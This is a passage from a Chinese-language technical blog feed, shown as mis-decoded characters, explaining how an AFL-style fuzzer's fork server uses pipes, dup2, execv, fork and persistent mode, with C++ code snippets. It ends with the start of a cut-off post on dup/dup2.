é€šçŸ¥çˆ¶è¿›ç¨‹<code>forkserver</code>å‡†å¤‡å¥½ï¼Œå¹¶è¿›å…¥<code>loop</code>å¾ªç¯</p></li></ol><p>å­è¿›ç¨‹è¯¦ç»†æè¿°å¦‚ä¸‹ï¼š</p><p>è°ƒç”¨<code>execv</code>ä¹‹å‰ï¼š</p><ol><li>é‡å®šå‘<code>FORKSRV_FD</code>åˆ°<code>ctl_pipe[0]</code>,é‡å®šå‘<code>FORKSRV_FD + 1</code>åˆ°<code>st_pipe[1]</code><br>1. å­è¿›ç¨‹åªèƒ½è¯»å–å‘½ä»¤<br>2.  å­è¿›ç¨‹åªèƒ½å‘é€(â€œå†™å‡ºâ€)çŠ¶æ€</li><li>å…³é—­å­è¿›ç¨‹é‡Œçš„ä¸€äº›æ–‡ä»¶æè¿°ç¬¦</li><li><code>execv(target_path, argv)</code>å¸¦å‚æ•°æ‰§è¡Œtarget</li></ol><p><font color='red'>ç¬¬ä¸€ä¸ªtargetä¼šè¿›å…¥<code>_fn_start_forkserver_loop</code>ï¼Œå¹¶å……å½“fork serverï¼Œåœ¨æ•´ä¸ªFuzzçš„è¿‡ç¨‹ä¸­ï¼Œå®ƒéƒ½ä¸ä¼šç»“æŸï¼Œæ¯æ¬¡è¦Fuzzä¸€æ¬¡targetï¼Œéƒ½ä¼šä»è¿™ä¸ªfork server forkå‡ºæ¥ä¸€ä¸ªå­è¿›ç¨‹å»fuzzã€‚</font></p><p><code>execv: target</code>ç›®æ ‡ä¸­<code>_fn_start_forkserver:</code></p><ul><li><p>é¦–å…ˆè®¾ç½®<code>child_stopped</code>ä¸º0ï¼Œç„¶åé€šè¿‡<code>FORKSRV_FD + 1</code>å‘çŠ¶æ€ç®¡é“å†™å…¥4ä¸ªå­—èŠ‚ï¼Œå‘ŠçŸ¥<code>fuzzçˆ¶è¿›ç¨‹</code>å·²ç»å‡†å¤‡å¥½äº†ã€‚</p></li><li><p>ç„¶åè¿›å…¥<code>fuzz loop</code>å¾ªç¯</p><ul><li><p>é€šè¿‡readä»æ§åˆ¶ç®¡é“<code>FORKSRV_FD</code>è¯»å–4ä¸ªå­—èŠ‚ï¼Œå¦‚æœå½“å‰ç®¡é“ä¸­æ²¡æœ‰å†…å®¹ï¼Œå°±ä¼šå µå¡åœ¨è¿™é‡Œï¼Œå¦‚æœè¯»åˆ°äº†ï¼Œå°±ä»£è¡¨<code>fuzzçˆ¶è¿›ç¨‹</code>å‘½ä»¤æˆ‘ä»¬<code>fork server</code>å»æ‰§è¡Œä¸€æ¬¡fuzz</p></li><li><p>å¦‚æœ<code>child_stopped</code>ä¸º0 :</p><p>åˆ™ç›´æ¥forkå‡ºä¸€ä¸ªå­è¿›ç¨‹å»è¿›è¡Œfuzzç„¶åæ­¤æ—¶å¯¹äºå­è¿›ç¨‹å°±ä¼šå…³é—­å’Œæ§åˆ¶ç®¡é“å’ŒçŠ¶æ€ç®¡é“ç›¸å…³çš„fdï¼Œç„¶åreturnè·³å‡º<code>fuzz loop</code>ï¼Œæ¢å¤æ­£å¸¸æ‰§è¡Œã€‚</p></li><li><p>å¦‚æœ<code>child_stopped</code>ä¸º1ï¼Œè¿™æ˜¯å¯¹äºpersistent modeçš„ç‰¹æ®Šå¤„ç†ï¼Œæ­¤æ—¶å­è¿›ç¨‹è¿˜æ´»ç€ï¼Œåªæ˜¯è¢«æš‚åœäº†ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡<code>kill(child_pid, SIGCONT)</code>æ¥ç®€å•çš„é‡å¯ï¼Œç„¶åè®¾ç½®<code>child_stopped</code>ä¸º0ã€‚</p></li><li><p>ç„¶åfork serverå‘çŠ¶æ€ç®¡é“<code>FORKSRV_FD + 1</code>å†™å…¥å­è¿›ç¨‹çš„pidï¼Œç„¶åç­‰å¾…å­è¿›ç¨‹ç»“æŸï¼Œæ³¨æ„è¿™é‡Œå¯¹äºpersistent modeï¼Œæˆ‘ä»¬ä¼šè®¾ç½®waitpidçš„ç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºWUNTRACEDï¼Œä»£è¡¨è‹¥å­è¿›ç¨‹è¿›å…¥æš‚åœçŠ¶æ€ï¼Œåˆ™é©¬ä¸Šè¿”å›ã€‚</p></li><li><p>WIFSTOPPED(status)å®ç¡®å®šè¿”å›å€¼æ˜¯å¦å¯¹åº”äºä¸€ä¸ªæš‚åœå­è¿›ç¨‹ï¼Œå› ä¸ºåœ¨persistent modeé‡Œå­è¿›ç¨‹ä¼šé€šè¿‡SIGSTOPä¿¡å·æ¥æš‚åœè‡ªå·±ï¼Œå¹¶ä»¥æ­¤æŒ‡ç¤ºè¿è¡ŒæˆåŠŸï¼Œæ‰€ä»¥åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬éœ€è¦å†è¿›è¡Œä¸€æ¬¡fuzzï¼Œå°±åªéœ€è¦å’Œä¸Šé¢ä¸€æ ·ï¼Œé€šè¿‡SIGCONTä¿¡å·æ¥å”¤é†’å­è¿›ç¨‹ç»§ç»­æ‰§è¡Œå³å¯ï¼Œä¸éœ€è¦å†è¿›è¡Œä¸€æ¬¡fuzzã€‚</p><p>è®¾ç½®<code>child_stopped</code>ä¸º1ã€‚</p></li><li><p>å½“å­è¿›ç¨‹ç»“æŸä»¥åï¼Œå‘çŠ¶æ€ç®¡é“<code>FORKSRV_FD + 1</code>å†™å…¥4ä¸ªå­—èŠ‚ï¼Œé€šçŸ¥<code>fuzzçˆ¶è¿›ç¨‹</code>è¿™æ¬¡targetæ‰§è¡Œç»“æŸäº†ã€‚</p></li></ul></li></ul><p>çˆ¶è¿›ç¨‹è¯¦ç»†æè¿°å¦‚ä¸‹ï¼š</p><ol><li><p>å…³é—­ä¸éœ€è¦çš„endpoints</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token function">close</span><span class="token punctuation">(</span>ctl_pipe<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>st_pipe<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fsrv_ctl_fd <span class="token operator">=</span> ctl_pipe<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//çˆ¶è¿›ç¨‹åªèƒ½å‘é€("å†™å‡º")å‘½ä»¤</span>fsrv_st_fd <span class="token operator">=</span> st_pipe<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//çˆ¶è¿›ç¨‹åªèƒ½è¯»å–çŠ¶æ€</span></code></pre></li><li><p>ç­‰å¾…fork serverå¯åŠ¨ï¼Œä½†æ˜¯ä¸èƒ½ç­‰å¤ªä¹…</p><ol><li>ä»ç®¡é“é‡Œè¯»å–4ä¸ªå­—èŠ‚åˆ°statusé‡Œï¼Œå¦‚æœè¯»å–æˆåŠŸï¼Œåˆ™ä»£è¡¨fork serveræˆåŠŸå¯åŠ¨ï¼Œå°±ç»“æŸè¿™ä¸ªå‡½æ•°å¹¶è¿”å›ã€‚</li><li>å¦‚æœè¶…æ—¶ï¼Œå°±æŠ›å‡ºå¼‚å¸¸ã€‚</li></ol></li><li><p>å­è¿›ç¨‹å¯åŠ¨å¼‚å¸¸å¤„ç†</p></li></ol></div><h2 id="æºç ï¼š">æºç ï¼š</h2><div class="story post-story"><p><strong>å¼€å¯ç®¡é“ï¼š</strong></p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> st_pipe<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ctl_pipe<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">/*  = 0 success */</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">pipe</span><span class="token punctuation">(</span>st_pipe<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">pipe</span><span class="token punctuation">(</span>ctl_pipe<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"pipe() failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><strong>å­è¿›ç¨‹ï¼š</strong></p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>forksrv_pid <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">ACTF</span><span class="token punctuation">(</span><span class="token string">"[%d:/child] child "</span><span class="token punctuation">,</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">/* cid code */</span>        <span class="token function">setsid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">close</span><span class="token punctuation">(</span>ctl_pipe<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* å…³é—­ctl å†™ç«¯ */</span>        <span class="token function">close</span><span class="token punctuation">(</span>st_pipe<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* å…³é—­st è¯»ç«¯ */</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">dup2</span><span class="token punctuation">(</span>ctl_pipe<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> FORKSRV_FD<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"dup2() failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">dup2</span><span class="token punctuation">(</span>st_pipe<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> FORKSRV_FD <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"dup2() failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">ACTF</span><span class="token punctuation">(</span><span class="token string">"[%d:/child] start to execv %s"</span><span class="token punctuation">,</span><span class="token constant">__LINE__</span><span class="token punctuation">,</span>target_path<span class="token punctuation">.</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">execv</span><span class="token punctuation">(</span>target_path<span class="token punctuation">.</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> argv<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span></code></pre><p>çˆ¶è¿›ç¨‹ï¼š</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* fpid code */</span><span class="token function">ACTF</span><span class="token punctuation">(</span><span class="token string">"[%d:/parent] start to parent "</span><span class="token punctuation">,</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>ctl_pipe<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* close read */</span><span class="token function">close</span><span class="token punctuation">(</span>st_pipe<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* close write */</span> fsrv_ctl_fd <span class="token operator">=</span> ctl_pipe<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">/* write */</span> fsrv_st_fd <span class="token operator">=</span> st_pipe<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">/* read */</span><span class="token comment">/* Wait for the fork server to come up, but don't wait too long. */</span>it<span class="token punctuation">.</span>it_value<span class="token punctuation">.</span>tv_sec <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>exec_tmout <span class="token operator">*</span> <span class="token number">100</span><span class="token operator">*</span>FORK_WAIT_MULT<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>it<span class="token punctuation">.</span>it_value<span class="token punctuation">.</span>tv_usec <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>exec_tmout <span class="token operator">*</span> <span class="token number">100</span><span class="token operator">*</span>FORK_WAIT_MULT<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">1000</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">;</span><span class="token function">setitimer</span><span class="token punctuation">(</span>ITIMER_REAL<span class="token punctuation">,</span><span class="token operator">&amp;</span>it<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>rlen <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>fsrv_st_fd<span class="token punctuation">,</span><span class="token operator">&amp;</span>status<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ACTF</span><span class="token punctuation">(</span><span class="token string">"[%d:/parent] rlen = : %d \n"</span><span class="token punctuation">,</span><span class="token constant">__LINE__</span><span class="token punctuation">,</span>rlen<span class="token punctuation">)</span><span class="token punctuation">;</span>it<span class="token punctuation">.</span>it_value<span class="token punctuation">.</span>tv_sec <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>it<span class="token punctuation">.</span>it_value<span class="token punctuation">.</span>tv_usec <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token function">setitimer</span><span class="token punctuation">(</span>ITIMER_REAL<span class="token punctuation">,</span> <span class="token operator">&amp;</span>it<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>rlen <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">OKF</span><span class="token punctuation">(</span><span class="token string">"[%d:/parent] All right - fork server is up."</span><span class="token punctuation">,</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"[%d:/parent] Fork server handshake failed"</span><span class="token punctuation">,</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>**execv:**ä¸­</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">_fn_start_forkserver</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> u8 tmp<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    i32 child_pid<span class="token punctuation">;</span>    u8 child_stopped <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">(</span>FORKSRV_FD <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> tmp<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">4</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"write FORKSRV_FD+1 !=4  %d"</span><span class="token punctuation">,</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token function">OKF</span><span class="token punctuation">(</span><span class="token string">"[%d:/execv] Fuzz  I am ready\n"</span><span class="token punctuation">,</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">OKF</span><span class="token punctuation">(</span><span class="token string">"[%d:/execv] _fn_forkserver_loop ...."</span><span class="token punctuation">,</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        u32 was_killed<span class="token punctuation">;</span>        i32 status<span class="token punctuation">;</span>        <span class="token comment">/* Wait for parent by reading from the pipe. Abort if read fails. */</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>FORKSRV_FD<span class="token punctuation">,</span> <span class="token operator">&amp;</span>was_killed<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token comment">// PFATAL("abort read fails %d",__LINE__);</span>            <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>         <span class="token comment">/* If we stopped the child in persistent mode, but there was a race        condition and afl-fuzz already issued SIGKILL, write off the old        process. */</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>child_stopped <span class="token operator">&amp;&amp;</span> was_killed <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            child_stopped <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">waitpid</span><span class="token punctuation">(</span>child_pid<span class="token punctuation">,</span> <span class="token operator">&amp;</span>status<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"write off the old process. %d"</span><span class="token punctuation">,</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>         <span class="token punctuation">&#125;</span>        <span class="token function">OKF</span><span class="token punctuation">(</span><span class="token string">"[%d:/execv]  ...."</span><span class="token punctuation">,</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>child_stopped<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">OKF</span><span class="token punctuation">(</span><span class="token string">"[%d:/execv] start a child pid "</span><span class="token punctuation">,</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">/* Once woken up, create a clone of our process. */</span>            child_pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>child_pid <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">/* In child process: close fds, resume execution. */</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>child_pid<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token function">OKF</span><span class="token punctuation">(</span><span class="token string">"[%d:/execv] close FORKSRV_FD &amp; FORKSRV_FD+1"</span><span class="token punctuation">,</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">close</span><span class="token punctuation">(</span>FORKSRV_FD<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">close</span><span class="token punctuation">(</span>FORKSRV_FD <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token comment">/* Special handling for persistent mode: if the child is alive but            currently stopped, simply restart it with SIGCONT. */</span>            <span class="token function">OKF</span><span class="token punctuation">(</span><span class="token string">"[%d:/execv] kill child_pid"</span><span class="token punctuation">,</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">kill</span><span class="token punctuation">(</span>child_pid<span class="token punctuation">,</span> SIGCONT<span class="token punctuation">)</span><span class="token punctuation">;</span>            child_stopped <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span>        <span class="token function">OKF</span><span class="token punctuation">(</span><span class="token string">"[%d:/execv]  ...."</span><span class="token punctuation">,</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">/* In parent process: write PID to pipe, then wait for child. */</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">(</span>FORKSRV_FD <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>child_pid<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">waitpid</span><span class="token punctuation">(</span>child_pid<span class="token punctuation">,</span> <span class="token operator">&amp;</span>status<span class="token punctuation">,</span> is_persistent <span class="token operator">?</span> WUNTRACED <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">/* In persistent mode, the child stops itself with SIGSTOP to indicate        a successful run. In this case, we want to wake it up without forking        again. */</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">WIFSTOPPED</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">)</span> child_stopped <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token comment">/* Relay wait status to pipe, then loop back. */</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">(</span>FORKSRV_FD <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>status<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> é€šä¿¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è¿›ç¨‹é—´é€šä¿¡ç®¡é“è¿›é˜¶ç¯‡:Linuxä¸‹dup/dup2å‡½æ•°çš„ç”¨æ³•</title>
      <link href="/posts/f5e51397/"/>
      <url>/posts/f5e51397/</url>
      
        <content type="html"><![CDATA[<p>ç”±äºåˆ©ç”¨ç®¡é“å®ç°è¿›ç¨‹é—´é€šä¿¡ï¼Œæ˜¯é€šè¿‡åˆ›å»ºä¸¤ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œä½†æ˜¯æè¿°ç¬¦çš„åˆå§‹åŒ–æ˜¯é€šè¿‡éšæœºçš„ï¼Œå°±æ˜¯ä»å¯ç”¨çš„æ–‡ä»¶æè¿°ç¬¦ä¸­å–å‡ºï¼Œå¹¶å°†å¯ç”¨çš„æ–‡ä»¶æè¿°ç¬¦ä¸fileå¯¹è±¡ç›¸å…³è”ï¼Œå¦‚æœæˆ‘ä»¬éœ€è¦å°†ç®¡é“çš„ä¸¤å¤´ä¸å…¶ä»–çš„æµç›¸å…³æ—¶ï¼Œå°±éœ€è¦é‡å®šå‘æ“ä½œï¼Œé‡å®šå‘fd[0]å’Œfd[1]çš„fileï¼Œä¸‹é¢æ˜¯å…³äºå®ç°é‡å®šå‘çš„å‡½æ•°dupå’Œdup2çš„è§£é‡Šï¼š</p><p>ç³»ç»Ÿè°ƒç”¨dupå’Œdup2èƒ½å¤Ÿå¤åˆ¶æ–‡ä»¶æè¿°ç¬¦ã€‚dupè¿”å›æ–°çš„æ–‡ä»¶æ–‡ä»¶æè¿°ç¬¦ï¼ˆæ²¡æœ‰ç”¨çš„æ–‡ä»¶æè¿°ç¬¦æœ€å°çš„ç¼–å·ï¼‰ã€‚dup2å¯ä»¥è®©ç”¨æˆ·æŒ‡å®šè¿”å›çš„æ–‡ä»¶æè¿°ç¬¦çš„å€¼ï¼Œå¦‚æœéœ€è¦ï¼Œåˆ™é¦–å…ˆæ¥è¿‘newfdçš„å€¼ï¼Œä»–é€šå¸¸ç”¨æ¥é‡æ–°æ‰“å¼€æˆ–è€…é‡å®šå‘ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ã€‚</p><p>ä»–çš„åŸå‹å¦‚ä¸‹ï¼š</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unsitd.h></span></span><span class="token keyword">int</span> <span class="token function">dup</span><span class="token punctuation">(</span><span class="token keyword">int</span> oldfd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">dup2</span><span class="token punctuation">(</span><span class="token keyword">int</span> oldfd<span class="token punctuation">,</span><span class="token keyword">int</span> newfd<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>dup å’Œdup2éƒ½æ˜¯è¿”å›æ–°çš„æè¿°ç¬¦ã€‚æˆ–è€…è¿”å›-1å¹¶è®¾ç½® errnoå˜é‡ã€‚æ–°è€æè¿°ç¬¦å…±äº«æ–‡ä»¶çš„åç§»é‡ï¼ˆä½ç½®ï¼‰ã€æ ‡å¿—å’Œé”ï¼Œä½†æ˜¯ä¸å…±äº«close-on-execæ ‡å¿—ã€‚</p><p>ç›¸ä¿¡å¤§éƒ¨åˆ†åœ¨Unix/Linuxä¸‹ç¼–ç¨‹çš„ç¨‹åºå‘˜æ‰‹å¤´ä¸Šéƒ½æœ‰ã€ŠUnixç¯å¢ƒé«˜çº§ç¼–ç¨‹ã€‹(APUE)è¿™æœ¬è¶…çº§ç»å…¸å·¨è‘—ã€‚ä½œè€…åœ¨è¯¥ä¹¦ä¸­è®²è§£dup/dup2ä¹‹å‰æ›¾ç»è®²è¿‡â€œæ–‡ä»¶å…±äº«â€ï¼Œè¿™å¯¹ç†è§£dup/dup2è¿˜æ˜¯å¾ˆæœ‰å¸®åŠ©çš„ã€‚è¿™é‡Œåšç®€å•æ‘˜å½•ä»¥å¤‡åœ¨åé¢çš„åˆ†æä¸­ä½¿ç”¨ï¼š<br>Stevens said:<br>(1) æ¯ä¸ªè¿›ç¨‹åœ¨è¿›ç¨‹è¡¨ä¸­éƒ½æœ‰ä¸€ä¸ªè®°å½•é¡¹ï¼Œæ¯ä¸ªè®°å½•é¡¹ä¸­æœ‰ä¸€å¼ æ‰“å¼€æ–‡ä»¶æè¿°ç¬¦è¡¨ï¼Œå¯å°†è§†ä¸ºä¸€ä¸ªçŸ¢é‡ï¼Œæ¯ä¸ªæè¿°ç¬¦å ç”¨ä¸€é¡¹ã€‚ä¸æ¯ä¸ªæ–‡ä»¶æè¿°ç¬¦ç›¸å…³è”çš„æ˜¯ï¼š<br>(a) æ–‡ä»¶æè¿°ç¬¦æ ‡å¿—ã€‚<br>(b) æŒ‡å‘ä¸€ä¸ªæ–‡ä»¶è¡¨é¡¹çš„æŒ‡é’ˆã€‚<br>(2) å†…æ ¸ä¸ºæ‰€æœ‰æ‰“å¼€æ–‡ä»¶ç»´æŒä¸€å¼ æ–‡ä»¶è¡¨ã€‚æ¯ä¸ªæ–‡ä»¶è¡¨é¡¹åŒ…å«ï¼š<br>(a) æ–‡ä»¶çŠ¶æ€æ ‡å¿—(è¯»ã€å†™ã€å¢å†™ã€åŒæ­¥ã€éé˜»å¡ç­‰)ã€‚<br>(b) å½“å‰æ–‡ä»¶ä½ç§»é‡ã€‚<br>Â© æŒ‡å‘è¯¥æ–‡ä»¶vèŠ‚ç‚¹è¡¨é¡¹çš„æŒ‡é’ˆã€‚<br>å›¾ç¤ºï¼š<br>æ–‡ä»¶æè¿°ç¬¦è¡¨<br>------------<br>fd0 0  | p0 -------------&gt; æ–‡ä»¶è¡¨0 ---------&gt; vnode0<br>------------<br>fd1 1  | p1 